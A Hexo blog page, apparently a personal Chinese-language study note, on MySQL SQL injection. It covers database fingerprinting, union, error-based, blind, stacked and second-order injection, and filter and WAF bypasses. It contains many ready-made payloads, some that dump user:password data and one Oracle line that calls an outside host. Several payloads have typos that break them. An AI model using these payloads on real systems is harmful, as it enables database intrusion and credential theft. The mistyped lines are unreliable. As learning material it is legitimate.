@@ -1,0 +1,1023 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>Hexo</title>
+        <meta name="author" content="John Doe">
+        <meta name="description" content="">
+        <meta name="keywords" content="">
+        <link rel="icon" href="">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
+        
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hexo</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;about</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;tags</span>
+        </a>
+        
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;Hexo</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
+                </div>
+            </a>
+            
+            <a href="about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
+                </div>
+            </a>
+            
+            <a href="archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
+                </div>
+            </a>
+            
+            <a href="categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
+                </div>
+            </a>
+            
+            <a href="tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+<div class="article">
+    <div>
+        <h1> </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+        
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="chakSQl注入"><a href="#chakSQl注入" class="headerlink" title="chakSQl注入"></a>chakSQl注入</h1><p>概念：</p>
+<p>SQL是操作数据库数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。SQL注入就是由于程序员的疏忽对我们的输入检测不到位导致我们可以在输入中插入命令从而实现无登录的数据库查询</p>
+<p>常见的数据库：</p>
+<p>关系数据库：mysql,sqlite,oracle,sqlserver(mssql),Postgre SQL</p>
+<p>非关系数据库：mongodeb,redis</p>
+<p><strong>关系型数据库与非关系型数据库区别</strong>：</p>
+<p>关系型数据库：依据关系模型创建数据，表现为二维表格</p>
+<p>​		易于维护，使用方便，读写性能差，灵活度欠佳</p>
+<p>非关系数据库：不是关系数据库的统称。有多种表现形式如文档，键值，列</p>
+<p>​			格式灵活，速度快，高扩展性</p>
+<p>不同的数据库由于语法，函数的差异，以及前端语法的不同，在利用时方法会有些许不同</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>有可控参数，并且这个参数如果是从数据库获取数据，那么这个地方可能存在sql注入</p>
+<p>最经典的应该是登录界面了</p>
+<h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>1.wappalyzer指纹识别</p>
+<p>2.报错返回信息</p>
+<p>3.特殊的命令字符</p>
+<p>​		null”和“%00”是Access支持的注释。<br>​		#”是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和&#x2F;* <em>&#x2F;注释<br>​		“–”和&#x2F;</em> *&#x2F;是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。<br>​		“;”是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。</p>
+<p>4.数据报报头</p>
+<p>5.数据库特有的表</p>
+<p>​		SQLServer数据库特有的表是：<strong>sysobjects</strong> ，所以可以用它来判断是否是SQLServer数据库</p>
+<p><code>exists(select*from sysobjects)  </code>  </p>
+<p>6.常见端口，组合</p>
+<p>​	  Oracle 1521</p>
+<pre><code>  SQL Server 1433
+</code></pre>
+<p>​	  Mysql 3306</p>
+<p>​	Asp+.net : sqlserver</p>
+<p>​	Php : Mysql+postgresql</p>
+<p>​	java:mysql+oracle</p>
+<p>​	iis:sqlserver</p>
+<p>​	apache:mysql+postgresql</p>
+<p>我们单以mysql为例</p>
+<p>我们判断是否存在sql注入的的基本思路就是猜测查询语法，尝试闭合查询语句，观察查询结果。如果尝试闭合后得到了理想的结果，基本确定该处是sql注入</p>
+<h2 id="mysql利用"><a href="#mysql利用" class="headerlink" title="mysql利用"></a>mysql利用</h2><p>注意：在确定漏洞后务必明确使用的数据库以及前后端环境，这对后面的sql注入利用至关重要！！！</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><code>UNION</code>可以将前后两个查询语句的结果拼接到一起，但是会自动去重。</p>
+<p><code>UNION ALL</code>功能相同，但是会显示所有数据，不会去重。</p>
+<p><strong>在确定注入类型，闭合情况后，第一步要确定的是列数：</strong></p>
+<p>eg：1’ order by 3#	逐步增大直到报错</p>
+<p>或1’ union select 1,2,3#	逐步添加直到报错</p>
+<p><strong>然后确定回显位置</strong></p>
+<p>eg：-1’ union select 1,2,3#	</p>
+<p>ps：若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。<br>⼀定要拼接够足够的字段数，否则SQL语句报错</p>
+<p><strong>确定回显位置后就可以替换上sql语句查询数据库内容了</strong></p>
+<p>爆库-&gt;爆表-&gt;爆字段-&gt;爆数据</p>
+<pre><code>1&#39; union select 1,database(),3#  //返回相应数据库
+
+#获取数据空中的表
+1’ union select group_concat(table_name) form information_shema.tables where table_schema=database(),2,3#
+#获取表中的字段名
+1&#39; union select 1,group_concat(column_name) from information_schema.column where table_name=&#39;表名&#39;,3#
+#获取字符串
+1&#39; or 1=1 union select group_concat(字段1,字段2,字段3,……) from 表名
+PS:注意长度限制，默认是1024字节
+解决办法:
+1&#39; or 1=1 union select group_concat(字段1,字段2),group_count(字段3) from 表名
+</code></pre>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入思路是利用报错的回显，让其在报错的同时执行我们的注入语句</p>
+<p><strong>报错的过程可能会出现在查询或者插入甚至删除的过程中。</strong></p>
+<p>报错型注入则是利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果</p>
+<h4 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h4><p>concat()函数：将括号里的内容拼接</p>
+<p>rand()函数：根据种子生成数，如果留空会生成[0,1)的随机数，否则生成的数是固定的</p>
+<p>floor()函数：向下取整</p>
+<p>count()函数:统计行数</p>
+<p>group by：分组去重</p>
+<p>双查询注入样例：</p>
+<pre><code class="mysql">select floor(rand(14)*2) c, count(*) from information_schema.columns group by c
+</code></pre>
+<p> SQL语句中用列c分组，而列c是floor(rand(14)2)的别名</p>
+<p>floor(rand(14)*2)生成的数列为1，0，1，0</p>
+<p>在查询时，数据库会建立一个临时表，并设置unique约束的group_key和tally两个字段，查询时，如果group_key不在表中，就将其加入表中，如果存在，tally加一</p>
+<p>创建好临时表后，Mysql开始逐行扫描information_schema.columns表，遇到的第一个分组列是floor(rand(14)*2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)*2)，注意此时又计算了一次，结果为0。所以实际插入到临时表的一行group_key为0，tally为1。</p>
+<p>查询下一个分组列，还是floor(rand(14)*2)，这次计算结果为1，表中group_key没有，就会被添加。而添加时tally为0，group_key填入floor(rand(14)*2)时又被计算为0，而group_key为0的行已存在，由于其设置了不可重复约束，就会出现报错</p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>对xml查询函数</p>
+<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
+<pre><code class="mysql">and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))
+</code></pre>
+<p>ps： extractvalue() 能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用 substring() 函数截取。</p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml;"></a>updatexml;</h4><ul>
+<li>第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc</li>
+<li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li>
+<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li>
+</ul>
+<p>作用：改变文档中符合条件的节点的值</p>
+<p>由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。</p>
+<pre><code class="mysql">&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+</code></pre>
+<p>ps：updatexml 能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用 substring() 函数截取。</p>
+<h4 id="exp-x"><a href="#exp-x" class="headerlink" title="exp(x)"></a>exp(x)</h4><p>返回 e 的 x 次方,当 数据过大 溢出时报错</p>
+<pre><code class="mysql">mail=&#39;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e))) as asd))--+
+</code></pre>
+<p>ps:5.5&lt;mysql版本&lt;5.6</p>
+<h4 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h4><pre><code>and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)
+</code></pre>
+<p>ps:查询内容为定值</p>
+<h4 id="geometrycollection-mysql-版本5-5-5-6"><a href="#geometrycollection-mysql-版本5-5-5-6" class="headerlink" title="geometrycollection() mysql 版本5.5-5.6"></a>geometrycollection() mysql 版本5.5-5.6</h4><p>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）</p>
+<p>报错：因为MYSQL无法使用这样的字符串画出图形，所以报错</p>
+<pre><code class="mysql">1&#39;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#39;manage&#39; limit 0,1)a)b)); %23
+</code></pre>
+<h4 id="multipoint-mysql-版本5-5"><a href="#multipoint-mysql-版本5-5" class="headerlink" title="multipoint() mysql 版本5.5"></a>multipoint() mysql 版本5.5</h4><p>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序</p>
+<p>报错：同样是因为无法使用字符串画出图形与geometrycollection类似</p>
+<pre><code class="mysql">1&#39;) and multipoint((select * from(select * from(select version())a)b)); %23
+</code></pre>
+<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><pre><code class="mysql">&#39;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage))asd)asd))--+
+</code></pre>
+<h4 id="mutipolygon"><a href="#mutipolygon" class="headerlink" title="mutipolygon()"></a>mutipolygon()</h4><pre><code class="mysql">&#39;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage))asd)asd))
+</code></pre>
+<h4 id="multlinestring"><a href="#multlinestring" class="headerlink" title="multlinestring ()"></a>multlinestring ()</h4><pre><code>and multlinestring((select * from (操作代码)a)b))
+</code></pre>
+<h4 id="linestring-）"><a href="#linestring-）" class="headerlink" title="linestring(）"></a>linestring(）</h4><p>报错：mysql的有些几何函数（ 例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() ）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)</p>
+<pre><code class="mysql">1&#39;) and linestring((select * from(select * from(select database())a)b))--+;
+</code></pre>
+<h4 id="ST-LatFromGeoHash-或-ST-LongFromGeoHash（mysql-gt-x3D-5-7-x）"><a href="#ST-LatFromGeoHash-或-ST-LongFromGeoHash（mysql-gt-x3D-5-7-x）" class="headerlink" title="ST.LatFromGeoHash()或 ST.LongFromGeoHash（mysql&gt;&#x3D;5.7.x）"></a>ST.LatFromGeoHash()或 ST.LongFromGeoHash（mysql&gt;&#x3D;5.7.x）</h4><pre><code class="mysql">&#39;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e))))a)b))--+
+</code></pre>
+<h4 id="GTID-MySQL-gt-x3D-5-6-X-显错-lt-x3D-200"><a href="#GTID-MySQL-gt-x3D-5-6-X-显错-lt-x3D-200" class="headerlink" title="GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)"></a>GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)</h4><pre><code class="mysql">&#39;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e),1)--+
+</code></pre>
+<pre><code class="mysql">&#39;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e),1)--+
+</code></pre>
+<h4 id="使用-join-using-报错获取列名"><a href="#使用-join-using-报错获取列名" class="headerlink" title="使用 join using() 报错获取列名"></a>使用 join using() 报错获取列名</h4><p>通过关键字join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因（相同列名存在），而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
+<pre><code class="mysql">1&#39; union all select * from (select * from users as a join users b using(id,username,password))c#
+</code></pre>
+<p>ps：在知道数据库跟表名的情况下使用才可以爆字段</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>与一般注入不同，布尔盲注只能通过页面状况得到真假判断而不知结果</p>
+<p>substr()：截取字符函数</p>
+<p>ASCII()：转换为ascii码</p>
+<p>&gt;&lt;&#x3D;^：判断符号</p>
+<p>首先通过页面对于永真条件<code>or 1=1</code> 与永假条件 <code>and 1=2</code> 的返回内容是否存在差异进行判断是否可以进行布尔盲注。</p>
+<p>eg：</p>
+<pre><code class="mysql">?id=0&#39;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)--+
+</code></pre>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>有的界面甚至无法根据页面判断真假，这时我们可以添加时间延迟作为判断依据</p>
+<p>eg：</p>
+<pre><code class="mysql">admin&#39; and if(ascii(substr((select database()),1,1))&gt;1,sleep(3),0)#
+</code></pre>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>使用；标志一条sql语句结束。与联合注入类似可以执行多个语句，不同的是除了查询语句以外还可以执行修改等命令。不过堆叠注入受环境限制较大。</p>
+<p>一般存在堆叠注入的都是由于使用 <code>mysqli_multi_query()</code> 函数执行的sql语句，该函数可以执行一个或多个针对数据库的查询，多个查询用分号进行分隔。</p>
+<p>show：查看</p>
+<p>rename：修改表名</p>
+<p>alter、rename：修改表名和字段名</p>
+<p> HANDLER 语句</p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>我们控制自己想要查询的语句插入到数据库中再去找一个<strong>能显示插入数据的回显的地方</strong>（可能是登陆后的用户名等等、也有可能是删除后显示删除内容的地方~）</p>
+<p>这里还有一个点，我们不能直接将要查询的函数插入，因为如果直接插入的话，<code>&#39;database()&#39;</code>会被识别为字符串，我们需要想办法闭合前后单引号的同时将我们的查询插入，就出现了<code>&#39;0&#39;+database()+&#39;0&#39;</code>这样的构造，但是这个的回显是<code>0</code>，但是在我们进行了hex编码之后就能正常的查询了，也就是上面出现的<code>&#39;0&#39;+hex(database())+&#39;0&#39;</code></p>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提交</p>
+<h3 id="8-0新特性"><a href="#8-0新特性" class="headerlink" title="8.0新特性"></a>8.0新特性</h3><h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。<br>支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。</p>
+<p>形成一个新的列表，从表中读取数据</p>
+<p>table 123 from xxx；</p>
+<p><strong>与SELECT的区别</strong>：</p>
+<blockquote>
+<p>1.TABLE始终显示表的所有列<br>2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句</p>
+</blockquote>
+<h4 id="VALUES"><a href="#VALUES" class="headerlink" title="VALUES"></a>VALUES</h4><p>列出一行的值</p>
+<p>VALUES是把一组一个或多个行作为表展示出来，返回的也是一个表数据。</p>
+<p>;INSERT INTO users (id,username,passwd) VALUES (1,’admin’,’admin’); –+</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><pre><code>、#    %23    --+或-- -    ;%00
+</code></pre>
+<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>大小写，双写，字符串拼接</p>
+<h4 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h4><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!内容*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
+<h4 id="and，or-xor-not"><a href="#and，or-xor-not" class="headerlink" title="and，or,xor,not"></a>and，or,xor,not</h4><p>管道符：</p>
+<pre><code>and =&gt; &amp;&amp;
+or =&gt; ||
+xor = |
+not = !
+</code></pre>
+<p>异或盲注</p>
+<pre><code>异或运算规则:
+1^1=0 0^0=0 0^1=1
+1^1^1=0 1^1^0=0
+构造payload:&#39;^ascii(mid(database(),1,1)=98)^0
+</code></pre>
+<h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><pre><code># 使用注释符/**/代替空格:
+select/**/database();
+
+# 使用加号+代替空格:(只适用于GET方法中)
+select+database();
+# 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)
+
+# 使⽤括号嵌套:
+select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());
+
+# 使⽤其他不可⻅字符代替空格:
+%09, %0a, %0b, %0c, %0d, %a0
+
+#利用``分隔进行绕过
+select host,user from user where user=&#39;a&#39;union(select`table_name`,`table_type`from`information_schema`.`tables`);
+</code></pre>
+<p>同时任然可以利用异或符号进行盲注，我i们可以看到上面的payload中完全可以不存在空格。</p>
+<h4 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h4><p>order by盲注</p>
+<h4 id="比较符号（-x3D-、-lt-、-gt-）"><a href="#比较符号（-x3D-、-lt-、-gt-）" class="headerlink" title="比较符号（&#x3D;、&lt;、&gt;）"></a>比较符号（&#x3D;、&lt;、&gt;）</h4><h5 id="in（）"><a href="#in（）" class="headerlink" title="in（）"></a>in（）</h5><pre><code>/?id=&#39; or ascii(substr((select database()),1,1)) in(114)--+    // 错误
+/?id=&#39; or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显
+</code></pre>
+<h5 id="LIKE-注入"><a href="#LIKE-注入" class="headerlink" title="LIKE 注入"></a>LIKE 注入</h5><p>在LIKE子句中，百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线 <code>_</code> 通配符允许匹配任何单个字符。匹配成功则返回1，反之返回0，可用于sql盲注。</p>
+<ol>
+<li>判断数据库长度</li>
+</ol>
+<p>可用length()函数，也可用<code>_</code>，如：</p>
+<pre><code class="2">/?id=&#39; or database() like &#39;________&#39;--+  // 回显正常
+</code></pre>
+<p>2.判断数据库名</p>
+<pre><code>/?id=&#39; or database() like &#39;s%&#39; --+
+/?id=&#39; or (select database()) like &#39;s%&#39; --+
+或者:
+/?id=&#39; or database() like &#39;s_______&#39; --+
+/?id=&#39; or (select database()) like &#39;s_______&#39; --+
+</code></pre>
+<h5 id="REGEXP-注入"><a href="#REGEXP-注入" class="headerlink" title="REGEXP 注入"></a>REGEXP 注入</h5><p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配</p>
+<ol>
+<li>判断数据库长度</li>
+</ol>
+<pre><code>/?id=&#39; or (length(database())) regexp 8 --+  // 回显正常
+</code></pre>
+<ol>
+<li>判断数据库名</li>
+</ol>
+<pre><code>/?id=&#39; or database() regexp &#39;^s&#39;--+    // 回显正常
+/?id=&#39; or database() regexp &#39;se&#39;--+    // 回显正常, 不适用^和$进行匹配也可以
+/?id=&#39; or database() regexp &#39;^sa&#39;--+   // 报错
+/?id=&#39; or database() regexp &#39;y$&#39;--+    // 回显正常
+</code></pre>
+<p>&lt;&gt; 等价于 !&#x3D;，所以在前面再加一个!结果就是等号了</p>
+<h5 id="函数代替比较："><a href="#函数代替比较：" class="headerlink" title="函数代替比较："></a>函数代替比较：</h5><p>greatest(n1, n2, n3…):返回n中的最大值<br>least(n1,n2,n3…):返回n中的最小值<br>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1<br>between a and b:范围在a-b之间</p>
+<h4 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h4><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>magic_quotes_gpc （魔术引号开关）</p>
+<p><code>magic_quotes_gpc</code>函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
+<p>addslashes()函数</p>
+<p>返回在预定义字符之前添加反斜杠的字符串</p>
+<blockquote>
+<p>预定义字符：单引号（’），双引号（”），反斜杠（\），NULL</p>
+</blockquote>
+<h6 id="宽字节概念："><a href="#宽字节概念：" class="headerlink" title="宽字节概念："></a>宽字节概念：</h6><ol>
+<li>单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)</li>
+<li>多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</li>
+<li>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</li>
+<li>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</li>
+<li>宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字</li>
+</ol>
+<p><strong>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。</strong></p>
+<p>例如说MySql的编码设置为了SET NAMES ‘gbk’或是 SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p>
+<p>比如我们输入1’</p>
+<p>处理后的sql执行语句为：</p>
+<pre><code>SELECT * FROM users WHERE id=&#39;1\&#39;&#39; LIMIT 0,1
+</code></pre>
+<p>被加了\转义</p>
+<p>由于\的GBK编码是%5c，‘運’字是%df%5c</p>
+<p>所以如果输入%df’就能吃到添加的反斜杠，转义失败</p>
+<h4 id="使用反斜杠-逃逸-Sql-语句"><a href="#使用反斜杠-逃逸-Sql-语句" class="headerlink" title="使用反斜杠 \ 逃逸 Sql 语句"></a>使用反斜杠 \ 逃逸 Sql 语句</h4><p>eg：</p>
+<pre><code>select username,password from users where username=&#39;admin\&#39; and password=&#39; or 1#&#39;
+</code></pre>
+<p>这样or 1逃逸出来，由此可控，可作为注入点</p>
+<h4 id="堆叠注入mysql预处理"><a href="#堆叠注入mysql预处理" class="headerlink" title="堆叠注入mysql预处理"></a>堆叠注入mysql预处理</h4><ol>
+<li>PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(<code>hello</code>)供之后调用</li>
+<li>EXECUTE：执行命令</li>
+<li>DEALLOCATE PREPARE：释放命令</li>
+<li>SET：用于设置变量(<code>@a</code>)</li>
+</ol>
+<pre><code class="mysql">1&#39;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#
+</code></pre>
+<h4 id="十六进制绕过关键词"><a href="#十六进制绕过关键词" class="headerlink" title="十六进制绕过关键词"></a>十六进制绕过关键词</h4><p>0x73686F7720646174616261736573&#x3D;show database</p>
+<pre><code>1&#39;;sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#
+</code></pre>
+<h4 id="ascii编码绕过"><a href="#ascii编码绕过" class="headerlink" title="ascii编码绕过"></a>ascii编码绕过</h4><pre><code>select * from users where username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110);
+</code></pre>
+<p>mysql7之后不能用</p>
+<h4 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h4><h5 id="from…for…绕过"><a href="#from…for…绕过" class="headerlink" title="from…for…绕过"></a>from…for…绕过</h5><pre><code>select substr((select database()),1,1);
+select substr((select database()) from 1 for 1);
+</code></pre>
+<h5 id="offset绕过"><a href="#offset绕过" class="headerlink" title="offset绕过"></a>offset绕过</h5><pre><code>select * from users limit 1 offset 2;
+# 此时 limit 1 offset 2 可以代替 limit 1,2
+</code></pre>
+<h5 id="join与别名绕过"><a href="#join与别名绕过" class="headerlink" title="join与别名绕过"></a>join与别名绕过</h5><pre><code>select host,user from user where user=&#39;a&#39;union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`=&#39;mysql&#39;)`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`=&#39;mysql&#39;)b));
+</code></pre>
+<h4 id="information-schema绕过与无列名注入"><a href="#information-schema绕过与无列名注入" class="headerlink" title="information_schema绕过与无列名注入"></a>information_schema绕过与无列名注入</h4><h4 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h4><pre><code>sleep() --&gt;benchmark()   benchmark(100000000,rand()),1)  +waitfor delay+&#39;0:0:5&#39;                                  utl_http.request(&#39;http://10.0.0.1&#39;)   HTTPURITYPE(&#39;http://10.0.0.1&#39;).getclob()   
+     decode(substr(user,1,1),&#39;A&#39;,(select count(*) from all_objects,all_objects,all_objects,all_objects),0)
+ascii()–&gt;hex()、bin()
+group_concat()–&gt;concat_ws()
+substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()
+user() --&gt; @@user
+datadir–&gt;@@datadir
